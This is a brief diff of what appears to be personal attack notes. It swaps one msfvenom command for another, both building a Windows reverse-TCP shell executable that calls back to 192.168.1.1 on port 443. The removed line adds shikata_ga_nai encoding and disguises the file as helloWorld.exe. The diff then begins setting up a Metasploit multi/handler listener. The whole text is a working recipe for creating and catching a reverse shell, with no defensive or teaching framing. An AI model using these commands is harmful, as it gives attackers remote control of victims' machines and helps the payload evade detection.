@@ -1,5 +1,5 @@
 :make a exe
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.1.1 lport=443 -b "\x00" -e x86/shikata_ga_nai -f exe > helloWorld.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 :setup lisener
 msfconsole
 use exploit/multi/handler
